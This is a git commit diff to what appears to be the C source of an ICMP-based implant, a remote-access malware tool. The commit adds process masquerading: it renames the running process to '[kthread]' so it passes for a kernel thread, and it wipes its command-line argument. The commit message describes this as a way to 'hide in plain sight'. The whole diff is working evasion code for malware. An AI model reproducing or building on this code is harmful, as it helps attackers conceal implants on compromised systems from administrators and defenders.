8bc9d4d279883aa235d01415536c21697c158b5d
g0rchy <g0rchy@github.com>
2022-10-28 21:08:24 +0100

    Added process masquerading to hide in plain sight

--- src/icmp-implant.c
+++ src/icmp-implant.c
@@ -1,5 +1,7 @@
 #include <stdio.h>
 #include <stdlib.h>
+#include <string.h>
+#include <sys/prctl.h>
 #include "../include/implant.h"
 
 int main(int argc, char **argv) {
@@ -8,6 +10,12 @@ int main(int argc, char **argv) {
         return 1;
     }
     
+    // process masquerading, change the command name associated with the proces (/proc/<pid>/comm)
+    prctl(PR_SET_NAME, "[kthread]", NULL, NULL, NULL);
+
+    strncpy(argv[0], "[kthread]", strlen(argv[0]) + 1);
+    strncpy(argv[1], "\0", strlen(argv[1]));
+
     implant_init_n_call(argv[1]);
 
     return 0;
